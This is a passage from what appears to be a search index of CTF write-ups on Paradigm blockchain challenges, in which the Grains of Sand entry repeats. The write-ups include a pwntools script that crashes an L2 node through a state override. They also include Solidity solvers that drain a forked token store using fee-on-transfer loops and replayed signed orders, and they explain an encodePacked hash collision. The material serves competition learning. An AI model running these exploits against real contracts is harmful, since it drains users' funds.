can leverage the state override set to ephemerally override the code at 0x31337 and simulate the call The admin_func_run() function is the entry point of ADMIN . To invoke the fn_dump_state() function, the first two bytes should be 0x0204 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 pub const ADMIN : PrecompileAddress = PrecompileAddress ( crate :: u64_to_address ( 1337 ), Precompile :: Context ( admin_func_run ), ); fn fn_reload_runtime_config ( rest : & [ u8 ], _context : & CallContext ) -> u64 { if rest . len () == 0 { return 1 u64 } else { return match ConfigKind :: from_u8 ( rest [ 0 ]) { .. . ConfigKind :: DumpState => fn_dump_state ( & rest [ 1 .. ]), _ => 1 u64 }; } } fn admin_func_run ( i : & [ u8 ], target_gas : u64 , context : & CallContext ) -> PrecompileResult { .. . if gas_base != target_gas { return Err ( Error :: OutOfGas ); } if i . len () == 0 || ! is_multisig ( & context ) { return Err ( Error :: EnterpriseHalt ); } let out = match AdminCallKind :: from_u8 ( i [ 0 ]) { AdminCallKind :: EmergencyStop => fn_emergency_stop ( & i [ 1 .. ], context ), AdminCallKind :: ReloadRuntimeConfig => fn_reload_runtime_config ( & i [ 1 .. ], context ), AdminCallKind :: Mint => fn_mint ( & i [ 1 .. ], context ), AdminCallKind :: Burn => fn_burn ( & i [ 1 .. ], context ), AdminCallKind :: Unknown => u64 :: MAX }; .. . } pub enum ConfigKind { .. . DumpState = 4 , Unknown , } pub enum AdminCallKind { EmergencyStop = 1 , ReloadRuntimeConfig = 2 , Mint = 3 , Burn = 4 , Unknown , }","title":"Solution"},{"location":"blockchain/paradigm/enterprise_blockchain/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 import pwn from time import sleep from cheb3 import Connection from cheb3.utils import compile_sol , encode_with_signature , decode_data bridge_abi , _ = compile_sol ( \"\"\" interface IBridge { function remoteTokenToLocalToken(address) external view returns (address); function ERC20Out(address token, address to, uint256 amount) external; } \"\"\" , solc_version = \"0.8.20\" , )[ \"IBridge\" ] flag_token_abi , _ = compile_sol ( \"\"\" interface IFlagToken { function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external view returns (uint256); } \"\"\" , solc_version = \"0.8.20\" , )[ \"IFlagToken\" ] HOST = \"localhost\" PORT = 1337 svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"action?\" , b \"1\" ) svr . recvuntil ( b \"rpc endpoints:\" ) l1 = Connection ( svr . recvline_contains ( b \"l1\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) l2 = Connection ( svr . recvline_contains ( b \"l2\" ) . replace ( b \"-\" , b \"\" ) . strip () . decode ()) priv = svr . recvline_contains ( b \"private\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () setup = svr . recvline_contains ( b \"challenge\" ) . split ( b \":\" )[ - 1 ] . strip () . decode () svr . close () l1account = l1 . account ( priv ) l2account = l2 . account ( priv ) bridge = decode_data ( l1account . call ( setup , data = encode_with_signature ( \"BRIDGE()\" )), [ \"address\" ] ) l1bridge = l1 . contract ( l1account , address = bridge , abi = bridge_abi ) l2bridge = l2 . contract ( l2account , address = bridge , abi = bridge_abi ) flag_token_addr = decode_data ( l1account . call ( setup , data = encode_with_signature ( \"FLAG_TOKEN()\" )), [ \"address\" ] ) flag_token = l1 . contract ( l1account , address = flag_token_addr , abi = flag_token_abi ) # Transfer FlagTokens from L1 to L2 flag_token . functions . approve ( bridge , int ( 1e18 )) . send_transaction () l1bridge . functions . ERC20Out ( flag_token_addr , l2account . address , int ( 1e18 ) ) . send_transaction () # Waiting for message to be relayed sleep ( 2 ) l2token = l2bridge . caller . remoteTokenToLocalToken ( flag_token_addr ) # Waiting for the latest state to be dumped sleep ( 5 ) # Transfer FlagTokens from L2 to L1 for i in range ( 100 ): balance = flag_token . caller . balanceOf ( bridge ) print ( f \"FlagToken balance of l1Bridge: { balance } \" ) if balance < int ( 90e18 ): break l2balance = decode_data ( l2account . call ( l2token , data = encode_with_signature ( \"balanceOf(address)\" , l2account . address ), ), [ \"uint256\" ], ) print ( f \"FlagToken L2 balance of player: { l2balance } \" ) l2bridge . functions . ERC20Out ( l2token , l1account . address , int ( 5e17 ) - i # avoid same relay message hash ) . send_transaction () # Waiting for message to be relayed sleep ( 2 ) while True : try : # Kill the L2 node l2account . call ( \"0x0000000000000000000000000000000000031337\" , state_override = { \"0x0000000000000000000000000000000000031337\" : { # address(1337).staticcall{gas: 2000}(abi.encodePacked(hex\"0204\", new bytes(0x11))) \"code\" : \"0x6002600053600460015360006000601360006105396107d0fa\" }, }, ) continue except : # Waiting for L2 node to restart sleep ( 5 ) break svr = pwn . remote ( HOST , PORT ) svr . sendlineafter ( b \"action?\" , b \"3\" ) svr . interactive ()","title":"Exploitation"},{"location":"blockchain/paradigm/enterprise_blockchain/#flag","text":"PCTF{57473_0V3RR1d35_90_8RR}","title":"Flag"},{"location":"blockchain/paradigm/enterprise_blockchain/#references","text":"rust - Unexpected segfault when working with raw pointers - Stack Overflow Arrays and Slices - Rust By Example pointer - Rust eth_call - Ethereum","title":"References"},{"location":"blockchain/paradigm/grains_of_sand/","tags":["smart contract","fee on transfer","signature replay","dune"],"text":"#smart contract #fee on transfer #signature replay #dune .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 At what point does it stop being a heap? Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.0 ; import \"forge-ctf/CTFDeployment.sol\" ; import \"../src/Challenge.sol\" ; contract Deploy is CTFDeployment { function deploy ( address system , address ) internal override returns ( address challenge ) { vm . startBroadcast ( system ); challenge = address ( new Challenge ()); vm . stopBroadcast (); } } src/Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; contract Challenge { IERC20 private immutable TOKEN = IERC20 ( 0xC937f5027D47250Fa2Df8CbF21F6F88E98817845 ); address private immutable TOKENSTORE = 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8 ; uint256 private immutable INITIAL_BALANCE ; constructor () { INITIAL_BALANCE = TOKEN . balanceOf ( TOKENSTORE ); } function isSolved () external view returns ( bool ) { return INITIAL_BALANCE - TOKEN . balanceOf ( TOKENSTORE ) >= 11111e8 ; } } Solution \u00b6 The private chain is forked from the Ethereum mainnet block with block number \\(18437825\\) . And to solve the challenge, the token balance of the token store needs to be decreased by at least \\(11111 \\times 10^8\\) 1 2 3 4 5 // challenge.py def get_anvil_instances ( self ) -> Dict [ str , LaunchAnvilInstanceArgs ] : return { \"main\" : self . get_anvil_instance ( fork_block_num = 18 _437_825 ), } The token GoldReserve (XGR) charges a fee when transferring, but the token store does not support fee-on-transfer tokens. So we can repeatedly deposit and withdraw to drain tokens from the store 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function depositToken ( address _token , uint _amount ) deprecable { ... if ( ! Token ( _token ). transferFrom ( msg . sender , this , _amount )) { revert (); } tokens [ _token ][ msg . sender ] = safeAdd ( tokens [ _token ][ msg . sender ], _amount ); // @note The amount received could be less than _amount Deposit ( _token , msg . sender , _amount , tokens [ _token ][ msg . sender ]); } function withdrawToken ( address _token , uint _amount ) { ... tokens [ _token ][ msg . sender ] = safeSub ( tokens [ _token ][ msg . sender ], _amount ); if ( ! Token ( _token ). transfer ( msg . sender , _amount )) { revert (); } Withdraw ( _token , msg . sender , _amount , tokens [ _token ][ msg . sender ]); } Now we need to get some GoldReserve tokens first! Through the trade() function, we can exchange for $XGR with signatures 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function trade ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s , uint _amount ) { bytes32 hash = sha256 ( this , _tokenGet , _amountGet , _tokenGive , _amountGive , _expires , _nonce ); // Check order signatures and expiration, also check if not fulfilled yet if ( ecrecover ( sha3 ( \"\\x19Ethereum Signed Message:\\n32\" , hash ), _v , _r , _s ) != _user || block . number > _expires || safeAdd ( orderFills [ _user ][ hash ], _amount ) > _amountGet ) { revert (); } tradeBalances ( _tokenGet , _amountGet , _tokenGive , _amountGive , _user , msg . sender , _amount ); orderFills [ _user ][ hash ] = safeAdd ( orderFills [ _user ][ hash ], _amount ); Trade ( _tokenGet , _amount , _tokenGive , _amountGive * _amount / _amountGet , _user , msg . sender , _nonce ); } function tradeBalances ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , address _user , address _caller , uint _amount ) private { ... tokens [ _tokenGet ][ _user ] = safeAdd ( tokens [ _tokenGet ][ _user ], safeAdd ( _amount , rebateValue )); tokens [ _tokenGet ][ _caller ] = safeSub ( tokens [ _tokenGet ][ _caller ], safeAdd ( _amount , feeTakeValue )); tokens [ _tokenGive ][ _user ] = safeSub ( tokens [ _tokenGive ][ _user ], tokenGiveValue ); tokens [ _tokenGive ][ _caller ] = safeAdd ( tokens [ _tokenGive ][ _caller ], tokenGiveValue ); tokens [ _tokenGet ][ feeAccount ] = safeAdd ( tokens [ _tokenGet ][ feeAccount ], safeSub ( feeTakeValue , rebateValue )); ... } Trading orders can be partially filled. By using Dune , we can find unexpired orders for GoldReserve tokens. Luckily, there are two orders with large amounts of unsold tokens XD tx_hash _amount _amountGet 0x1483f5c6158dfb9a899b137ccfa988fb2b1f6927854dcd83e0a29caadd0e38ba 4200000000000000 84000000000000000 0x6d727f761c7744bebf4a8773f5a06cd7af280dcda0b55c0995aea47d5570f1a1 4246800000000000 42468000000000000 Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 interface ITokenStore { function tokens ( address _token , address _user ) external view returns ( uint256 ); function deposit () external payable ; function depositToken ( address _token , uint _amount ) external ; function withdrawToken ( address _token , uint _amount ) external ; function trade ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s , uint _amount ) external ; function availableVolume ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s ) external view returns ( uint256 ); } contract Solve is CTFSolver { ITokenStore tokenStore = ITokenStore ( 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8 ); function doTrade ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s ) internal { uint256 amount = tokenStore . availableVolume ( _tokenGet , _amountGet , _tokenGive , _amountGive , _expires , _nonce , _user , _v , _r , _s ); tokenStore . trade ( _tokenGet , _amountGet , _tokenGive , _amountGive , _expires , _nonce , _user , _v , _r , _s , amount ); } function solve ( address _challenge , address player ) internal override { Challenge challenge = Challenge ( _challenge ); address token = 0xC937f5027D47250Fa2Df8CbF21F6F88E98817845 ; tokenStore . deposit { value : 10 ether }(); // to buy $XGR doTrade ( address ( 0 ), 84000000000000000 , token , 200000000000 , 108142282 , 470903382 , address ( 0xa219Fb3CfAE449F6b5157c1200652cc13e9c9EA8 ), 28 , 0xf164a3e185694dadeb11a9e9e7371929675d2eb2a6e9daa4508e96bc81741018 , 0x314f3b6d5ce7c3f396604e87373fe4fe0a10bef597287d840b942e57595cb29a ); doTrade ( address ( 0 ), 42468000000000000 , token , 1000000000000 , 109997981 , 249363390 , address ( 0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C ), 28 , 0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397 , 0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e ); IERC20 ( token ). approve ( address ( tokenStore ), type ( uint256 ). max ); tokenStore . withdrawToken ( token , tokenStore . tokens ( token , player )); while ( ! challenge . isSolved ()) { tokenStore . depositToken ( token , IERC20 ( token ). balanceOf ( player )); tokenStore . withdrawToken ( token , tokenStore . tokens ( token , player )); } } } Flag \u00b6 PCTF{f33_70K3nS_cauS1n9_pR08L3Ms_a9a1N}","title":"Grains of Sand"},{"location":"blockchain/paradigm/grains_of_sand/#description","text":"At what point does it stop being a heap? Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.0 ; import \"forge-ctf/CTFDeployment.sol\" ; import \"../src/Challenge.sol\" ; contract Deploy is CTFDeployment { function deploy ( address system , address ) internal override returns ( address challenge ) { vm . startBroadcast ( system ); challenge = address ( new Challenge ()); vm . stopBroadcast (); } } src/Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; contract Challenge { IERC20 private immutable TOKEN = IERC20 ( 0xC937f5027D47250Fa2Df8CbF21F6F88E98817845 ); address private immutable TOKENSTORE = 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8 ; uint256 private immutable INITIAL_BALANCE ; constructor () { INITIAL_BALANCE = TOKEN . balanceOf ( TOKENSTORE ); } function isSolved () external view returns ( bool ) { return INITIAL_BALANCE - TOKEN . balanceOf ( TOKENSTORE ) >= 11111e8 ; } }","title":"Description"},{"location":"blockchain/paradigm/grains_of_sand/#solution","text":"The private chain is forked from the Ethereum mainnet block with block number \\(18437825\\) . And to solve the challenge, the token balance of the token store needs to be decreased by at least \\(11111 \\times 10^8\\) 1 2 3 4 5 // challenge.py def get_anvil_instances ( self ) -> Dict [ str , LaunchAnvilInstanceArgs ] : return { \"main\" : self . get_anvil_instance ( fork_block_num = 18 _437_825 ), } The token GoldReserve (XGR) charges a fee when transferring, but the token store does not support fee-on-transfer tokens. So we can repeatedly deposit and withdraw to drain tokens from the store 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function depositToken ( address _token , uint _amount ) deprecable { ... if ( ! Token ( _token ). transferFrom ( msg . sender , this , _amount )) { revert (); } tokens [ _token ][ msg . sender ] = safeAdd ( tokens [ _token ][ msg . sender ], _amount ); // @note The amount received could be less than _amount Deposit ( _token , msg . sender , _amount , tokens [ _token ][ msg . sender ]); } function withdrawToken ( address _token , uint _amount ) { ... tokens [ _token ][ msg . sender ] = safeSub ( tokens [ _token ][ msg . sender ], _amount ); if ( ! Token ( _token ). transfer ( msg . sender , _amount )) { revert (); } Withdraw ( _token , msg . sender , _amount , tokens [ _token ][ msg . sender ]); } Now we need to get some GoldReserve tokens first! Through the trade() function, we can exchange for $XGR with signatures 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function trade ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s , uint _amount ) { bytes32 hash = sha256 ( this , _tokenGet , _amountGet , _tokenGive , _amountGive , _expires , _nonce ); // Check order signatures and expiration, also check if not fulfilled yet if ( ecrecover ( sha3 ( \"\\x19Ethereum Signed Message:\\n32\" , hash ), _v , _r , _s ) != _user || block . number > _expires || safeAdd ( orderFills [ _user ][ hash ], _amount ) > _amountGet ) { revert (); } tradeBalances ( _tokenGet , _amountGet , _tokenGive , _amountGive , _user , msg . sender , _amount ); orderFills [ _user ][ hash ] = safeAdd ( orderFills [ _user ][ hash ], _amount ); Trade ( _tokenGet , _amount , _tokenGive , _amountGive * _amount / _amountGet , _user , msg . sender , _nonce ); } function tradeBalances ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , address _user , address _caller , uint _amount ) private { ... tokens [ _tokenGet ][ _user ] = safeAdd ( tokens [ _tokenGet ][ _user ], safeAdd ( _amount , rebateValue )); tokens [ _tokenGet ][ _caller ] = safeSub ( tokens [ _tokenGet ][ _caller ], safeAdd ( _amount , feeTakeValue )); tokens [ _tokenGive ][ _user ] = safeSub ( tokens [ _tokenGive ][ _user ], tokenGiveValue ); tokens [ _tokenGive ][ _caller ] = safeAdd ( tokens [ _tokenGive ][ _caller ], tokenGiveValue ); tokens [ _tokenGet ][ feeAccount ] = safeAdd ( tokens [ _tokenGet ][ feeAccount ], safeSub ( feeTakeValue , rebateValue )); ... } Trading orders can be partially filled. By using Dune , we can find unexpired orders for GoldReserve tokens. Luckily, there are two orders with large amounts of unsold tokens XD tx_hash _amount _amountGet 0x1483f5c6158dfb9a899b137ccfa988fb2b1f6927854dcd83e0a29caadd0e38ba 4200000000000000 84000000000000000 0x6d727f761c7744bebf4a8773f5a06cd7af280dcda0b55c0995aea47d5570f1a1 4246800000000000 42468000000000000","title":"Solution"},{"location":"blockchain/paradigm/grains_of_sand/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 interface ITokenStore { function tokens ( address _token , address _user ) external view returns ( uint256 ); function deposit () external payable ; function depositToken ( address _token , uint _amount ) external ; function withdrawToken ( address _token , uint _amount ) external ; function trade ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s , uint _amount ) external ; function availableVolume ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s ) external view returns ( uint256 ); } contract Solve is CTFSolver { ITokenStore tokenStore = ITokenStore ( 0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8 ); function doTrade ( address _tokenGet , uint _amountGet , address _tokenGive , uint _amountGive , uint _expires , uint _nonce , address _user , uint8 _v , bytes32 _r , bytes32 _s ) internal { uint256 amount = tokenStore . availableVolume ( _tokenGet , _amountGet , _tokenGive , _amountGive , _expires , _nonce , _user , _v , _r , _s ); tokenStore . trade ( _tokenGet , _amountGet , _tokenGive , _amountGive , _expires , _nonce , _user , _v , _r , _s , amount ); } function solve ( address _challenge , address player ) internal override { Challenge challenge = Challenge ( _challenge ); address token = 0xC937f5027D47250Fa2Df8CbF21F6F88E98817845 ; tokenStore . deposit { value : 10 ether }(); // to buy $XGR doTrade ( address ( 0 ), 84000000000000000 , token , 200000000000 , 108142282 , 470903382 , address ( 0xa219Fb3CfAE449F6b5157c1200652cc13e9c9EA8 ), 28 , 0xf164a3e185694dadeb11a9e9e7371929675d2eb2a6e9daa4508e96bc81741018 , 0x314f3b6d5ce7c3f396604e87373fe4fe0a10bef597287d840b942e57595cb29a ); doTrade ( address ( 0 ), 42468000000000000 , token , 1000000000000 , 109997981 , 249363390 , address ( 0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C ), 28 , 0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397 , 0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e ); IERC20 ( token ). approve ( address ( tokenStore ), type ( uint256 ). max ); tokenStore . withdrawToken ( token , tokenStore . tokens ( token , player )); while ( ! challenge . isSolved ()) { tokenStore . depositToken ( token , IERC20 ( token ). balanceOf ( player )); tokenStore . withdrawToken ( token , tokenStore . tokens ( token , player )); } } }","title":"Exploitation"},{"location":"blockchain/paradigm/grains_of_sand/#flag","text":"PCTF{f33_70K3nS_cauS1n9_pR08L3Ms_a9a1N}","title":"Flag"},{"location":"blockchain/paradigm/one_hundred_percent/","tags":["smart contract","abi.encodePacked","collisions"],"text":"#smart contract #abi.encodePacked #collisions .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Your funds are safe when you use our innovative new payment splitter that ensure that 100% of assets make it to their intended recipients. Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"forge-ctf/CTFDeployment.sol\" ; import \"src/Split.sol\" ; import \"src/Challenge.sol\" ; contract Deploy is CTFDeployment { function deploy ( address system , address ) internal override returns ( address challenge ) { vm . startBroadcast ( system ); Split split = new Split (); address [] memory addrs = new address []( 2 ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000dEaD ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000bEEF ); uint32 [] memory percents = new uint32 []( 2 ); percents [ 0 ] = 5e5 ; percents [ 1 ] = 5e5 ; uint256 id = split . createSplit ( addrs , percents , 0 ); Split . SplitData memory splitData = split . splitsById ( id ); splitData . wallet . deposit { value : 100 ether }(); challenge = address ( new Challenge ( split )); vm . stopBroadcast (); } } src/Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import \"../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol\" ; import \"./Split.sol\" ; contract Challenge { Split public immutable SPLIT ; constructor ( Split split ) { SPLIT = split ; } function isSolved () external view returns ( bool ) { Split . SplitData memory splitData = SPLIT . splitsById ( 0 ); return address ( SPLIT ). balance == 0 && address ( splitData . wallet ). balance == 0 ; } } src/Split.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol\" ; import \"./SplitWallet.sol\" ; contract Split is ERC721 ( \"Split\" , \"SPLIT\" ) { using ClonesWithImmutableArgs for address ; struct SplitData { bytes32 hash ; SplitWallet wallet ; } SplitWallet private immutable IMPLEMENTATION = new SplitWallet (); uint256 private immutable SCALE = 1e6 ; uint256 public nextId ; mapping ( uint256 => SplitData ) private _splitsById ; mapping ( address => mapping ( address => uint256 )) public balances ; modifier onlySplitOwner ( uint256 splitId ) { _onlySplitOwner ( splitId ); _ ; } function _onlySplitOwner ( uint256 splitId ) private view { require ( msg . sender == ownerOf ( splitId ), \"NOT_SPLIT_OWNER\" ); } modifier validSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) { _validSplit ( accounts , percents , relayerFee ); _ ; } function _validSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) private pure { require ( accounts . length == percents . length , \"MISMATCH_LENGTH\" ); uint256 sum ; for ( uint256 i = 0 ; i < accounts . length ; i ++ ) { sum += percents [ i ]; } require ( sum == SCALE , \"INVALID_PERCENTAGES\" ); require ( relayerFee < SCALE / 10 , \"INVALID_RELAYER_FEE\" ); } function createSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) external returns ( uint256 ) { return _createSplit ( accounts , percents , relayerFee , msg . sender ); } function createSplitFor ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , address owner ) external returns ( uint256 ) { return _createSplit ( accounts , percents , relayerFee , owner ); } function _createSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , address owner ) private validSplit ( accounts , percents , relayerFee ) returns ( uint256 ) { uint256 tokenId = nextId ++ ; address wallet = address ( IMPLEMENTATION ). clone ( abi . encodePacked ( address ( this ))); _splitsById [ tokenId ] = SplitData ({ hash : _hashSplit ( accounts , percents , relayerFee ), wallet : SplitWallet ( payable ( wallet ))}); _mint ( owner , tokenId ); return tokenId ; } function updateSplit ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) external { _updateSplit ( splitId , accounts , percents , relayerFee ); } function updateSplitAndDistribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) external { _updateSplit ( splitId , accounts , percents , relayerFee ); _distribute ( splitId , accounts , percents , relayerFee , token ); } function distribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) external { _distribute ( splitId , accounts , percents , relayerFee , token ); } function withdraw ( IERC20 [] calldata tokens , uint256 [] calldata amounts ) external { for ( uint256 i = 0 ; i < tokens . length ; i ++ ) { IERC20 token = tokens [ i ]; uint256 amount = amounts [ i ]; balances [ msg . sender ][ address ( token )] -= amount ; if ( address ( token ) == address ( 0x00 )) { payable ( msg . sender ). transfer ( amount ); } else { token . transfer ( msg . sender , amount ); } } } function _updateSplit ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) private onlySplitOwner ( splitId ) validSplit ( accounts , percents , relayerFee ) { _splitsById [ splitId ]. hash = _hashSplit ( accounts , percents , relayerFee ); } function _distribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) private { require ( _splitsById [ splitId ]. hash == _hashSplit ( accounts , percents , relayerFee )); SplitWallet wallet = _splitsById [ splitId ]. wallet ; uint256 storedWalletBalance = balances [ address ( wallet )][ address ( token )]; uint256 externalWalletBalance = wallet . balanceOf ( token ); uint256 totalBalance = storedWalletBalance + externalWalletBalance ; if ( msg . sender != ownerOf ( splitId )) { uint256 relayerAmount = totalBalance * relayerFee / SCALE ; balances [ msg . sender ][ address ( token )] += relayerAmount ; totalBalance -= relayerAmount ; } for ( uint256 i = 0 ; i < accounts . length ; i ++ ) { balances [ accounts [ i ]][ address ( token )] += totalBalance * percents [ i ] / SCALE ; } if ( storedWalletBalance > 0 ) { balances [ address ( wallet )][ address ( token )] = 0 ; } if ( externalWalletBalance > 0 ) { wallet . pullToken ( token , externalWalletBalance ); } } function _hashSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) internal pure returns ( bytes32 ) { return keccak256 ( abi . encodePacked ( accounts , percents , relayerFee )); } function splitsById ( uint256 id ) external view returns ( SplitData memory ) { return _splitsById [ id ]; } receive () external payable {} } src/SplitWallet.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import \"@clones-with-immutable-args/src/Clone.sol\" ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; contract SplitWallet is Clone { function deposit () external payable {} function pullToken ( IERC20 token , uint256 amount ) external { require ( msg . sender == _getArgAddress ( 0 )); if ( address ( token ) == address ( 0x00 )) { payable ( msg . sender ). transfer ( amount ); } else { token . transfer ( msg . sender , amount ); } } function balanceOf ( IERC20 token ) external view returns ( uint256 ) { if ( address ( token ) == address ( 0x00 )) { return address ( this ). balance ; } return token . balanceOf ( address ( this )); } } Solution \u00b6 To solve the challenge, the ether balance of both SPLIT and _splitsById[0].wallet should be 0 The distribute() function of Split can be used to distribute the specific asset in the SplitWallet , based on the accounts and percents that are specified during the creation of the SplitWallet . After distribution, users can withdraw based on the value stored in balances However, distribute() simply validates the parameters by comparing the hash of abi.encodePacked result, while both accounts and percents are dynamic types. Thus, accounts and percents can be slightly adjusted during distribution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function _distribute ( uint256 splitId , address [] memory accounts , uint32 [] memory percents , uint32 relayerFee , IERC20 token ) private { require ( _splitsById [ splitId ]. hash == _hashSplit ( accounts , percents , relayerFee )); ... } function _hashSplit ( address [] memory accounts , uint32 [] memory percents , uint32 relayerFee ) internal pure returns ( bytes32 ) { return keccak256 ( abi . encodePacked ( accounts , percents , relayerFee )); } During the creation of SplitWallet{id: 0} , index 1 account has been accidentally left uninitialized 1 2 3 4 5 address [] memory addrs = new address []( 2 ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000dEaD ); addrs [ 0 ] = address ( 0x000000000000000000000000000000000000bEEF ); ... uint256 id = split . createSplit ( addrs , percents , 0 ); So we can use modified accounts and percents to pull all ETH from SplitWallet{id: 0} but not 